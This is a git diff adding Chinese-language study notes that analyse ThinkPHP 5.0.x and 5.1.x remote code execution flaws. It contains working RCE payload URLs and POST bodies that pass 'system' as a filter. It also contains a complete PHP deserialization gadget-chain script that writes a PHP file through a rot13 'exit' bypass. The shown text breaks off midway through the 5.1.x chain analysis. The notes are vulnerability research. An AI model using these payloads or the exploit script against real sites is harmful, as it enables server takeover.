@@ -1474,7 +1474,11 @@ class Index
 
 [ThinkPHP5漏洞分析之代码执行10](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md)
 
-## 5.1.x版本
+## RCE方法1
+
+### 5.1.x版本
+
+5.1.0<=ThinkPHP<=5.1.30
 
 `?s=index/\think\Request/input&filter[]=system&data=pwd`
 
@@ -1944,3 +1948,1547 @@ $route = {数组} [3]
     }
 ```
 
+### 5.0.x版本
+
+5.0.7<=ThinkPHP5<=5.0.22
+
+>payload与5.1.x不太一样
+
+虽然两个版本的`\think\Request::input`差不多,但是由于5.0.x版本的`\think\Request::__construct`是`protected`的,因此不能进行反射操作
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251237352.png)
+
+可以使用`?s=index/\think\app/invokeFunction&function=call_user_func_array&vars[function_name]=system&vars[parameters][]=whoami`作为代替
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251255868.png)
+
+```php
+    /**
+     * 执行函数或者闭包方法 支持参数调用
+     * @access public
+     * @param string|array|\Closure $function 函数或者闭包
+     * @param array                 $vars     变量
+     * @return mixed
+     */
+    public static function invokeFunction($function, $vars = [])
+    {
+        $reflect = new \ReflectionFunction($function);
+        $args    = self::bindParams($reflect, $vars);
+        // 记录执行信息
+        self::$debug && Log::record('[ RUN ] ' . $reflect->__toString(), 'info');
+        return $reflect->invokeArgs($args);
+    }
+```
+
+## RCE方法2
+
+5.0.0<=ThinkPHP5<=5.0.23
+
+5.1.0<=ThinkPHP<=5.1.30
+
+### 5.0.x版本
+
+>测试版本为5.0.10
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251420354.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251516761.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251416169.png)
+
+```
+?s=captcha
+POST _method=__construct&filter[]=system&method=get&get[]=pwd
+```
+
+或者直接POST传参`_method=__construct&filter[]=system&method=get&get[]=pwd`
+
+#### 开启debug
+
+```php
+#thinkphp/start.php
+<?php
+namespace think;
+
+// ThinkPHP 引导文件
+// 加载基础文件
+require __DIR__ . '/base.php';
+// 执行应用
+App::run()->send();#进入App->run
+```
+
+```php
+#thinkphp/library/think/App.php
+    /**
+     * 执行应用程序
+     * @access public
+     * @param Request $request Request对象
+     * @return Response
+     * @throws Exception
+     */
+    public static function run(Request $request = null)
+    {
+        is_null($request) && $request = Request::instance();#调用\think\Request::__construct
+
+        try {
+            ...
+
+            // 获取应用调度信息
+            $dispatch = self::$dispatch;
+            if (empty($dispatch)) {
+                // 进行URL路由检测
+                $dispatch = self::routeCheck($request, $config);#关键点1
+                /*
+                $dispatch = {数组} [3]
+                 type = "method"
+                 method = {数组} [2]
+                  0 = "\think\captcha\CaptchaController"
+                  1 = "index"
+                 var = {数组} [0]
+                */
+            }
+            // 记录当前调度信息
+            $request->dispatch($dispatch);
+
+            // 记录路由和请求信息
+            if (self::$debug) {#当前debug处于开启状态
+                Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
+                Log::record('[ HEADER ] ' . var_export($request->header(), true), 'info');
+                Log::record('[ PARAM ] ' . var_export($request->param(), true), 'info');#关键点2
+            }
+            ...
+        } catch (HttpResponseException $exception) {
+            $data = $exception->getResponse();
+        }
+
+        ...
+    }
+```
+
+>关键点1
+
+```php
+    /**
+     * URL路由检测（根据PATH_INFO)
+     * @access public
+     * @param  \think\Request $request
+     * @param  array          $config
+     * @return array
+     * @throws \think\Exception
+     */
+    public static function routeCheck($request, array $config)
+    {
+        $path   = $request->path();
+        $depr   = $config['pathinfo_depr'];
+        $result = false;
+        // 路由检测
+        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config['url_route_on'];
+        if ($check) {
+            ...
+
+            // 路由检测（根据路由定义返回不同的URL调度）
+            $result = Route::check($request, $path, $depr, $config['url_domain_deploy']);
+            $must   = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must'];
+            if ($must && false === $result) {
+                // 路由无效
+                throw new RouteNotFoundException();
+            }
+        }
+        if (false === $result) {
+            // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索
+            $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
+        }
+        return $result;
+    }
+```
+
+```php
+#thinkphp/library/think/Route.php
+    /**
+     * 检测URL路由
+     * @access public
+     * @param Request   $request Request请求对象
+     * @param string    $url URL地址
+     * @param string    $depr URL分隔符
+     * @param bool      $checkDomain 是否检测域名规则
+     * @return false|array
+     */
+    public static function check($request, $url, $depr = '/', $checkDomain = false)
+    {
+        ...
+        $method = strtolower($request->method());
+        ...
+    }
+```
+
+```php
+#thinkphp/library/think/Request.php
+    /**
+     * 当前的请求类型
+     * @access public
+     * @param bool $method  true 获取原始请求类型
+     * @return string
+     */
+    public function method($method = false)
+    {
+        if (true === $method) {
+            // 获取原始请求类型
+            return IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
+        } elseif (!$this->method) {
+            if (isset($_POST[Config::get('var_method')])) {#Config::get('var_method') = _method
+                $this->method = strtoupper($_POST[Config::get('var_method')]);#POST传参 _method=__construct
+                $this->{$this->method}($_POST);#$this->__construct($_POST)
+                #对该类的任意方法的调用,其传入对应的参数即对应的$_POST数组
+            } elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) {
+                $this->method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']);
+            } else {
+                $this->method = IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
+            }
+        }
+        return $this->method;
+    }
+
+    /**
+     * 构造函数
+     * @access protected
+     * @param array $options 参数
+     */
+    protected function __construct($options = [])
+    {
+        foreach ($options as $name => $item) {
+            if (property_exists($this, $name)) {
+                $this->$name = $item;
+            }
+        }
+        if (is_null($this->filter)) {
+            $this->filter = Config::get('default_filter');
+        }
+
+        // 保存 php://input
+        $this->input = file_get_contents('php://input');
+    }
+```
+
+>关键点2
+
+```php
+#thinkphp/library/think/Request.php
+    /**
+     * 获取当前请求的参数
+     * @access public
+     * @param string|array  $name 变量名
+     * @param mixed         $default 默认值
+     * @param string|array  $filter 过滤方法
+     * @return mixed
+     */
+    public function param($name = '', $default = null, $filter = '')#$request->param() 因此 $name = ''
+    {
+        if (empty($this->param)) {
+            $method = $this->method(true);
+            // 自动获取请求变量
+            switch ($method) {
+                case 'POST':
+                    $vars = $this->post(false);
+                    /*
+                    $vars = {数组} [4]
+                     _method = "__construct"
+                     filter = {数组} [1]
+                      0 = "system"
+                     method = "get"
+                     get = {数组} [1]
+                      0 = "pwd"
+                    */
+                    break;
+                case 'PUT':
+                case 'DELETE':
+                case 'PATCH':
+                    $vars = $this->put(false);
+                    break;
+                default:
+                    $vars = [];
+            }
+            // 当前请求参数和URL地址中的参数合并
+            $this->param = array_merge($this->get(false), $vars, $this->route(false));
+        }
+        ...
+        return $this->input($this->param, $name, $default, $filter);#关键点 $name = ''
+    }
+
+    /**
+     * 获取变量 支持过滤和默认值
+     * @param array         $data 数据源
+     * @param string|false  $name 字段名
+     * @param mixed         $default 默认值
+     * @param string|array  $filter 过滤函数
+     * @return mixed
+     */
+    public function input($data = [], $name = '', $default = null, $filter = '')
+    /*
+    $data = {数组} [6]
+     0 = "pwd"
+     _method = "__construct"
+     filter = {数组} [1]
+      0 = "system"
+     method = "get"
+     get = {数组} [1]
+      0 = "pwd"
+     id = null
+    */
+    {
+        if (false === $name) {#强类型比较 返回false,没有直接return
+            // 获取原始数据
+            return $data;
+        }
+        $name = (string) $name;
+        if ('' != $name) {#$request->param() 因此 $name = '' 跳过
+            ...
+        }
+
+        // 解析过滤器
+        $filter = $this->getFilter($filter, $default);
+
+        if (is_array($data)) {
+            array_walk_recursive($data, [$this, 'filterValue'], $filter);#对数组中的每个成员递归地应用用户函数,即调用$this->filterValue
+            reset($data);
+        } else {
+            $this->filterValue($data, $name, $filter);
+        }
+        ...
+    }
+
+    /**
+     * 递归过滤给定的值
+     * @param mixed     $value 键值
+     * @param mixed     $key 键名
+     * @param array     $filters 过滤方法+默认值
+     * @return mixed
+     */
+    private function filterValue(&$value, $key, $filters)
+    {
+    /*
+    $filters = {数组} [1]
+     0 = "system"
+    $value = "pwd"
+    */
+        $default = array_pop($filters);
+        foreach ($filters as $filter) {
+            if (is_callable($filter)) {
+                // 调用函数或者方法过滤
+                $value = call_user_func($filter, $value);#达到RCE目的
+            } elseif (is_scalar($value)) {
+                ...
+            }
+        }
+        return $this->filterExp($value);
+    }
+```
+
+进入`App::run`后由于开启了debug,因此可以通过`Log::record('[ PARAM ] ' . var_export($request->param(), true), 'info');`进入到`\think\Request::param`
+
+在`\think\Request::param`中获取了当前请求的参数并通过`\think\Request::input`进行处理
+
+在`\think\Request::input`中通过`array_walk_recursive($data, [$this, 'filterValue'], $filter);`调用`
+\think\Request::filterValue`进行过滤,通过其中的`call_user_func`达到RCE目的
+
+#### 关闭debug
+
+```php
+#thinkphp/library/think/App.php
+    /**
+     * 执行应用程序
+     * @access public
+     * @param Request $request Request对象
+     * @return Response
+     * @throws Exception
+     */
+    public static function run(Request $request = null)
+    {
+        is_null($request) && $request = Request::instance();
+
+        try {
+            ...
+
+            // 获取应用调度信息
+            $dispatch = self::$dispatch;
+            if (empty($dispatch)) {
+                // 进行URL路由检测
+                $dispatch = self::routeCheck($request, $config);
+            }
+            // 记录当前调度信息
+            $request->dispatch($dispatch);
+
+            // 记录路由和请求信息
+            if (self::$debug) {#debug已关闭
+                Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
+                Log::record('[ HEADER ] ' . var_export($request->header(), true), 'info');
+                Log::record('[ PARAM ] ' . var_export($request->param(), true), 'info');
+            }
+            ...
+            $data = self::exec($dispatch, $config);
+            /*
+            $dispatch = {数组} [2]
+             type = "module"
+            */
+        } catch (HttpResponseException $exception) {
+            $data = $exception->getResponse();
+        }
+        ...
+    }
+
+    protected static function exec($dispatch, $config)
+    {
+        switch ($dispatch['type']) {
+            case 'redirect':
+                ...
+            case 'module':
+                // 模块/控制器/操作
+                $data = self::module($dispatch['module'], $config, isset($dispatch['convert']) ? $dispatch['convert'] : null);
+                break;
+        }
+        return $data;
+    }
+
+    /**
+     * 执行模块
+     * @access public
+     * @param array $result 模块/控制器/操作
+     * @param array $config 配置参数
+     * @param bool  $convert 是否自动转换控制器和操作名
+     * @return mixed
+     */
+    public static function module($result, $config, $convert = null)
+    {
+        ...
+        $request = Request::instance();
+        ...
+        // 当前模块路径
+        App::$modulePath = APP_PATH . ($module ? $module . DS : '');#$module="index"
+
+        // 是否自动转换控制器和操作名
+        $convert = is_bool($convert) ? $convert : $config['url_convert'];
+        // 获取控制器名
+        $controller = strip_tags($result[1] ?: $config['default_controller']);
+        $controller = $convert ? strtolower($controller) : $controller;#$controller="index"
+
+        // 获取操作名
+        $actionName = strip_tags($result[2] ?: $config['default_action']);
+        $actionName = $convert ? strtolower($actionName) : $actionName;#$actionName="index"
+        ...
+        $instance = Loader::controller($controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller']);#$instance = {app\index\controller\Index} [0]
+        // 获取当前操作名
+        $action = $actionName . $config['action_suffix'];#$action = "index"
+
+        $vars = [];
+        if (is_callable([$instance, $action])) {
+            // 执行操作方法
+            $call = [$instance, $action];
+        }
+        ...
+        return self::invokeMethod($call, $vars);#调用反射执行类的方法
+    }
+
+    /**
+     * 调用反射执行类的方法 支持参数绑定
+     * @access public
+     * @param string|array $method 方法
+     * @param array        $vars   变量
+     * @return mixed
+     */
+    public static function invokeMethod($method, $vars = [])
+    {
+        ...
+        $args = self::bindParams($reflect, $vars);#绑定参数
+        /*
+        $reflect = {ReflectionMethod} [2]
+         name = "index"
+         class = "app\index\controller\Index"
+        $vars = {数组} [0]
+        */
+        ...
+    }
+
+    /**
+     * 绑定参数
+     * @access private
+     * @param \ReflectionMethod|\ReflectionFunction $reflect 反射类
+     * @param array                                 $vars    变量
+     * @return array
+     */
+    private static function bindParams($reflect, $vars = [])
+    {
+        if (empty($vars)) {
+            // 自动获取请求变量
+            if (Config::get('url_param_type')) {
+                $vars = Request::instance()->route();
+            } else {
+                $vars = Request::instance()->param();#进入到\think\Request::param,后续步骤与前面一样
+            }
+        }
+        ...
+    }
+```
+
+在调用反射执行类的方法时进行参数绑定,从而调用`\think\Request::param`,进而达到RCE的目的
+
+### 5.1.x版本
+
+5.1.0<=ThinkPHP<=5.1.30
+
+>测试版本为5.1.6,同时开启debug
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251858287.png)
+
+原理与5.0.x版本开启debug的情况一样,同样是由于开启debug后thinkphp记录调试信息,从而调用`\think\Request::param`,后面的触发方式跟前面的一样
+
+```php
+// 记录路由和请求信息
+if ($this->debug) {
+    $this->log('[ ROUTE ] ' . var_export($this->request->routeInfo(), true));
+    $this->log('[ HEADER ] ' . var_export($this->request->header(), true));
+    $this->log('[ PARAM ] ' . var_export($this->request->param(), true));
+}
+```
+
+这个payload`_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al`无法复现...
+
+```php
+    /**
+     * 获取当前请求的路由规则（包括子分组、资源路由）
+     * @access protected
+     * @param  string      $method
+     * @return array
+     */
+    protected function getMethodRules($method)
+    {
+        return $this->rules[$method] + $this->rules['*'];#$this->rules[$method]不存在,因此报错
+    }
+```
+
+```
+$method = "__construct"
+$this = {think\route\Domain} [12]
+ rules = {数组} [8]
+  * = {数组} [0]
+  get = {数组} [2]
+  post = {数组} [0]
+  put = {数组} [0]
+  patch = {数组} [0]
+  delete = {数组} [0]
+  head = {数组} [0]
+  options = {数组} [0]
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204251942366.png)
+
+# 反序列化
+
+## 5.0.x版本
+
+5.0.24版本
+
+>关闭short_open_tag
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204271314339.png)
+
+```php
+<?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $s=input('post.s');
+        $s=base64_decode($s);
+        unserialize($s);
+    }
+}
+```
+
+1. 反序列化入口
+
+`\think\process\pipes\Windows::__destruct`
+
+```php
+#thinkphp/library/think/process/pipes/Windows.php
+    public function __destruct()
+    {
+        $this->close();
+        $this->removeFiles();
+    }
+    public function close()
+    {
+        parent::close();
+        foreach ($this->fileHandles as $handle) {
+            fclose($handle);
+        }
+        $this->fileHandles = [];
+    }
+    private function removeFiles()
+    {
+        foreach ($this->files as $filename) {
+            if (file_exists($filename)) {
+                @unlink($filename);
+            }
+        }
+        $this->files = [];
+    }
+#thinkphp/library/think/process/pipes/Pipes.php
+    public function close()#parent
+    {
+        foreach ($this->pipes as $pipe) {
+            fclose($pipe);
+        }
+        $this->pipes = [];
+    }
+
+```
+
+注意到存在`file_exists`,这个函数只接受`string`类型,因此可以利用这个函数调用某个对象的`__toString`方法
+
+2. __toString
+
+`\think\Model::__toString`
+
+```php
+#thinkphp/library/think/Model.php
+abstract class Model implements \JsonSerializable, \ArrayAccess{
+    public function __toString()
+    {
+        return $this->toJson();
+    }
+    public function toJson($options = JSON_UNESCAPED_UNICODE)
+    {
+        return json_encode($this->toArray(), $options);
+    }
+    public function toArray()
+    {
+        $item    = [];
+        $visible = [];
+        $hidden  = [];
+
+        $data = array_merge($this->data, $this->relation);
+
+        // 过滤属性
+        if (!empty($this->visible)) {
+            ...
+        } elseif (!empty($this->hidden)) {
+            ...
+        }
+
+        foreach ($data as $key => $val) {
+            ...
+        }
+        // 追加属性（必须定义获取器）
+        if (!empty($this->append)) {
+            foreach ($this->append as $key => $name) {
+                if (is_array($name)) {
+                    ...
+                } elseif (strpos($name, '.')) {
+                    ...
+                } else {
+                    $relation = Loader::parseName($name, 1, false);#字符串命名风格转换
+                    if (method_exists($this, $relation)) {
+                        $modelRelation = $this->$relation();#可以调用当前类的任意方法
+                        #getError()返回$this->error,参数可控
+                        $value         = $this->getRelationData($modelRelation);
+
+                        if (method_exists($modelRelation, 'getBindAttr')) {
+                            $bindAttr = $modelRelation->getBindAttr();
+                            if ($bindAttr) {
+                                foreach ($bindAttr as $key => $attr) {
+                                    $key = is_numeric($key) ? $attr : $key;
+                                    if (isset($this->data[$key])) {
+                                        throw new Exception('bind attr has exists:' . $key);
+                                    } else {
+                                        $item[$key] = $value ? $value->getAttr($attr) : null;
+                                    }
+                                }
+                                continue;
+                            }
+                        }
+                        $item[$name] = $value;
+                    } else {
+                        $item[$name] = $this->getAttr($name);
+                    }
+                }
+            }
+        }
+        return !empty($item) ? $item : [];
+    }
+    public function getError()
+    {
+        return $this->error;
+    }
+    protected function getRelationData(Relation $modelRelation)#获取关联模型数据,Relation $modelRelation 模型关联对象
+    {
+        if ($this->parent && !$modelRelation->isSelfRelation() && get_class($modelRelation->getModel()) == get_class($this->parent)) {
+            $value = $this->parent;#满足条件时,$value可控
+        } else {
+            ...
+        }
+        return $value;
+    }
+}
+
+#thinkphp/library/think/model/Relation.php
+abstract class Relation
+{
+    public function isSelfRelation()
+    {
+        return $this->selfRelation;#false
+    }
+    public function getModel()
+    {
+        return $this->query->getModel();
+    }
+}
+
+#thinkphp/library/think/model/relation/OneToOne.php
+abstract class OneToOne extends Relation
+{
+    public function getBindAttr()
+    {
+        return $this->bindAttr;
+    }
+}
+
+#thinkphp/library/think/db/Query.php
+class Query
+{
+    public function getModel()
+    {
+        return $this->model;
+    }
+}
+```
+
+首先设置下列属性,避免干扰
+
+```php
+$this->data = [];
+$this->relation = [];
+$this->visible = [];
+$this->hidden = [];
+```
+
+将`$this->append`设置为array('getError')`从而让`$modelRelation`的内容可控,需要满足`method_exists($modelRelation, 'getBindAttr')`,因此将`$this->error`设置为`\think\model\relation\OneToOne`某个子类的对象
+
+将`$this->parent`与`\think\db\Query::$model`设置为同一对象,使`$value = $this->parent;`,从而使`$value`可控
+
+将`\think\model\relation\OneToOne::$bindAttr`设置为`array(xxx)`,从而使`$attr`可控,最终通过` $value->getAttr($attr)`可以调用任意类的`getAttr`或者`__call`方法且参数可控
+
+3. __call
+
+`\think\console\Output`
+
+```php
+#thinkphp/library/think/console/Output.php
+    public function __call($method, $args)
+    {
+        if (in_array($method, $this->styles)) {
+            array_unshift($args, $method);
+            return call_user_func_array([$this, 'block'], $args);
+        }
+
+        if ($this->handle && method_exists($this->handle, $method)) {
+            return call_user_func_array([$this->handle, $method], $args);
+        } else {
+            throw new Exception('method not exists:' . __CLASS__ . '->' . $method);
+        }
+    }
+
+    protected function block($style, $message)
+    {
+        $this->writeln("<{$style}>{$message}</$style>");
+    }
+
+    public function writeln($messages, $type = self::OUTPUT_NORMAL)
+    {
+        $this->write($messages, true, $type);
+    }
+
+    public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
+    {
+        $this->handle->write($messages, $newline, $type);
+    }
+```
+
+首先要满足`in_array($method, $this->styles)`,`$method`为`getAttr`,因此需要在`$this->styles`中添加`'getAttr'`
+
+通过`block->writeln->write->$this->handle->write`从而调用任意类的`write`方法,但要注意只有`$messages`可控
+
+4. write
+
+`\think\session\driver\Memcached::write`
+
+```php
+#thinkphp/library/think/session/driver/Memcached.php
+    public function write($sessID, $sessData)
+    {
+        return $this->handler->set($this->config['session_name'] . $sessID, $sessData, $this->config['expire']);
+    }
+```
+
+调用任意类的`set`方法,但要注意只有`$sessID`和`$this->config`可控
+
+5. set
+
+`\think\cache\driver\File::set`
+
+```php
+#thinkphp/library/think/cache/driver/File.php
+    public function set($name, $value, $expire = null)
+    {
+        if (is_null($expire)) {
+            $expire = $this->options['expire'];
+        }
+        if ($expire instanceof \DateTime) {
+            $expire = $expire->getTimestamp() - time();
+        }
+        $filename = $this->getCacheKey($name, true);
+        if ($this->tag && !is_file($filename)) {
+            $first = true;
+        }
+        $data = serialize($value);
+        if ($this->options['data_compress'] && function_exists('gzcompress')) {
+            //数据压缩
+            $data = gzcompress($data, 3);
+        }
+        $data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
+        $result = file_put_contents($filename, $data);
+        if ($result) {
+            isset($first) && $this->setTagItem($filename);
+            clearstatcache();
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    protected function getCacheKey($name, $auto = false)
+    {
+        $name = md5($name);
+        if ($this->options['cache_subdir']) {
+            // 使用子目录
+            $name = substr($name, 0, 2) . DS . substr($name, 2);
+        }
+        if ($this->options['prefix']) {
+            $name = $this->options['prefix'] . DS . $name;
+        }
+        $filename = $this->options['path'] . $name . '.php';
+        $dir      = dirname($filename);
+
+        if ($auto && !is_dir($dir)) {
+            mkdir($dir, 0755, true);
+        }
+        return $filename;
+    }
+
+    protected function setTagItem($name)
+    {
+        if ($this->tag) {
+            $key       = 'tag_' . md5($this->tag);
+            $this->tag = null;
+            if ($this->has($key)) {
+                $value   = explode(',', $this->get($key));
+                $value[] = $name;
+                $value   = implode(',', array_unique($value));
+            } else {
+                $value = $name;
+            }
+            $this->set($key, $value, 0);
+        }
+    }
+```
+
+由于`$value`不可控,无法直接控制文件写入的内容,因此需要借助`setTagItem`中的`$this->set($key, $value, 0);`来控制文件写入内容,而`$value = $name;`,`$name`则来源于`getCacheKey`生成的文件名
+
+由于`$this->options`可控,因此可以控制文件名,由此可以控制文件写入的内容
+
+但是注意到在文件写入的内容之前存在`<?php exit();>`,需要进行绕过,这里用到了[死亡绕过的技巧](https://www.freebuf.com/articles/web/266565.html)
+
+利用rot13进行死亡绕过,同时将文件内容写入到缓存中
+
+```php
+<?php
+
+namespace think\process\pipes {
+
+    use think\Process;
+
+    class Windows
+    {
+        private $files;
+        private $fileHandles;
+
+        public function __construct(array $files)
+        {
+            $this->pipes = [];
+            $this->fileHandles = [];
+            $this->files = $files;
+        }
+    }
+}
+
+namespace think\model {
+
+    use think\Db;
+    use think\db\Query;
+    use think\Model;
+
+    class Merge
+    {
+        protected $data;
+        protected $relation;
+        protected $visible;
+        protected $hidden;
+        protected $append;
+        protected $error;
+        protected $parent;
+
+        public function __construct($modelRelation, $output)
+        {
+            $this->data = [];
+            $this->relation = [];
+            $this->visible = [];
+            $this->hidden = [];
+            $this->append = array('getError');
+            $this->error = $modelRelation;
+            $this->parent = $output;
+
+
+        }
+
+    }
+}
+
+namespace think\model\relation {
+
+    use think\db\Query;
+    use think\Loader;
+    use think\Model;
+
+    class HasOne
+    {
+
+        protected $model;
+        protected $selfRelation;
+        protected $query;
+        protected $bindAttr;
+
+        public function __construct($model, $query, array $bindAttr)
+        {
+            $this->model = $model;
+            $this->selfRelation = false;
+            $this->query = $query;
+            $this->bindAttr = $bindAttr;
+        }
+    }
+}
+
+namespace think\db {
+
+    use PDO;
+    use think\App;
+    use think\Cache;
+    use think\Collection;
+    use think\Config;
+    use think\Db;
+    use think\db\exception\BindParamException;
+    use think\db\exception\DataNotFoundException;
+    use think\db\exception\ModelNotFoundException;
+    use think\Exception;
+    use think\exception\DbException;
+    use think\exception\PDOException;
+    use think\Loader;
+    use think\Model;
+    use think\model\Relation;
+    use think\model\relation\OneToOne;
+    use think\Paginator;
+
+    class Query
+    {
+        protected $model;
+
+        public function __construct($model)
+        {
+            $this->model = $model;
+        }
+    }
+}
+
+namespace think\console {
+
+    use Exception;
+    use think\console\output\Ask;
+    use think\console\output\Descriptor;
+    use think\console\output\driver\Buffer;
+    use think\console\output\driver\Console;
+    use think\console\output\driver\Nothing;
+    use think\console\output\Question;
+    use think\console\output\question\Choice;
+    use think\console\output\question\Confirmation;
+
+    class Output
+    {
+        protected $styles;
+        private $handle;
+
+        public function __construct($handle)
+        {
+            $this->styles = [
+                'info',
+                'error',
+                'comment',
+                'question',
+                'highlight',
+                'warning',
+                'getAttr'
+            ];
+            $this->handle = $handle;
+        }
+    }
+}
+
+namespace think\session\driver {
+
+    use SessionHandler;
+    use think\Exception;
+
+    class Memcached
+    {
+        protected $handler;
+
+        public function __construct($handler)
+        {
+            $this->handler = $handler;
+        }
+    }
+}
+
+namespace think\cache\driver {
+
+    use think\cache\Driver;
+
+    class File
+    {
+        protected $options;
+        protected $tag;
+
+        public function __construct()
+        {
+            $this->options = [
+                'expire' => 0,
+                'cache_subdir' => false,
+                'prefix' => '',
+                'path' => 'php://filter/write=string.rot13/resource=<?cuc cucvasb();?>123',
+                'data_compress' => false,
+            ];
+            $this->tag = true;
+        }
+    }
+}
+namespace {
+    $file = new \think\cache\driver\File();
+    $handle = new \think\session\driver\Memcached($file);
+    $output = new \think\console\Output($handle);
+    $query = new \think\db\Query($output);
+    $relation = new \think\model\relation\HasOne($output, $query, array('lksadjflkasd'));
+    $model = new \think\model\Merge($relation, $output);
+    $s = new \think\process\pipes\Windows(array($model));
+    echo "s=" . urlencode(base64_encode(serialize($s)));
+}
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204271623083.png)
+
+但是存在一个问题,在浏览器中访问不了???
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204271641357.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204271640167.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204271642163.png)
+
+## 5.1.x版本
+
+5.1.30版本
+
+```php
+<?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $s=input('post.s');
+        $s=base64_decode($s);
+        unserialize($s);
+    }
+}
+```
+
+1. 反序列化入口
+
+一开始我是打算利用`\think\Process::__destruct`这里作为反序列化入口,想要利用`preg_split`中的反引号内容进行命令注入,但是在`proc_get_status($this->process);`这里要获取由`proc_open()`函数打开的进程的信息,这里没有办法利用反序列化生成,因此放弃这个入口
+
+```php
+#thinkphp/library/think/Process.php
+    public function __destruct()
+    {
+        $this->stop();
+    }
+
+    public function stop()
+    {
+        if ($this->isRunning()) {
+            if ('\\' === DIRECTORY_SEPARATOR && !$this->isSigchildEnabled()) {
+                ...
+            } else {
+                $pids = preg_split('/\s+/', `ps -o pid --no-heading --ppid {$this->getPid()}`);
+                foreach ($pids as $pid) {
+                    if (is_numeric($pid)) {
+                        posix_kill($pid, 9);
+                    }
+                }
+            }
+        }
+
+        $this->updateStatus(false);
+        if ($this->processInformation['running']) {
+            $this->close();
+        }
+
+        return $this->exitcode;
+    }
+
+    public function isRunning()
+    {
+        if (self::STATUS_STARTED !== $this->status) {
+            return false;
+        }
+
+        $this->updateStatus(false);
+
+        return $this->processInformation['running'];
+    }
+
+    protected function updateStatus($blocking)
+    {
+        if (self::STATUS_STARTED !== $this->status) {
+            return;
+        }
+
+        $this->processInformation = proc_get_status($this->process);
+        $this->captureExitCode();
+
+        $this->readPipes($blocking, '\\' === DIRECTORY_SEPARATOR ? !$this->processInformation['running'] : true);
+
+        if (!$this->processInformation['running']) {
+            $this->close();
+        }
+    }
+```
+
+`\think\process\pipes\Windows::__destruct`
+
+```php
+#thinkphp/library/think/process/pipes/Windows.php
+    public function __destruct()
+    {
+        $this->close();
+        $this->removeFiles();
+    }
+
+    public function close()
+    {
+        parent::close();
+        foreach ($this->fileHandles as $handle) {
+            fclose($handle);
+        }
+        $this->fileHandles = [];
+    }
+
+    public function close()#parent
+    {
+        foreach ($this->pipes as $pipe) {
+            fclose($pipe);
+        }
+        $this->pipes = [];
+    }
+
+    private function removeFiles()
+    {
+        foreach ($this->files as $filename) {
+            if (file_exists($filename)) {
+                @unlink($filename);
+            }
+        }
+        $this->files = [];
+    }
+```
+
+利用`file_exists`调用`__toString`(跟5.0.x一样)
+
+2. __toString
+
+`\think\model\concern\Conversion::__toString`
+
+```php
+#thinkphp/library/think/model/concern/Conversion.php
+trait Conversion
+{
+    public function __toString()
+    {
+        return $this->toJson();
+    }
+
+    public function toJson($options = JSON_UNESCAPED_UNICODE)
+    {
+        return json_encode($this->toArray(), $options);
+    }
+
+    public function toArray()
+    {
+        $item    = [];
+        $visible = [];
+        $hidden  = [];
+
+        // 合并关联数据
+        $data = array_merge($this->data, $this->relation);
+
+        // 过滤属性
+        if (!empty($this->visible)) {
+            ...
+        } elseif (!empty($this->hidden)) {
+            ...
+        }
+
+        foreach ($data as $key => $val) {
+            ...
+        }
+
+        // 追加属性（必须定义获取器）
+        if (!empty($this->append)) {
+            foreach ($this->append as $key => $name) {
+                if (is_array($name)) {
+                    // 追加关联对象属性
+                    $relation = $this->getRelation($key);#$relation可控
+
+                    if (!$relation) {
+                        ...
+                    }
+
+                    $item[$key] = $relation->append($name)->toArray();#可以调用任意类的append方法或__call方法且$name可控
+                } elseif (strpos($name, '.')) {
+                    ...
+                }
+                ...
+            }
+        }
+
+        return $item;
+    }
+}
+
+#thinkphp/library/think/model/concern/RelationShip.php
+#\think\model\concern\RelationShip::getRelation
+    public function getRelation($name = null)#$name为$this->append的键名
+    {
+        if (is_null($name)) {
+            return $this->relation;
+        } elseif (array_key_exists($name, $this->relation)) {
+            return $this->relation[$name];#$this->relation可控,因此返回值可控
+        }
+        return;
+    }
+```
+
+将`$this->append`设置为`array('misaka' => array());`满足条件`is_array($name)`
+
+此时`$key`为`misaka`,为了使`$relation = $this->getRelation($key);`可控,将`$this->relation`设置为`array('misaka' => 某个类的对象);`通过`$this->relation[$name]`达到可控
+
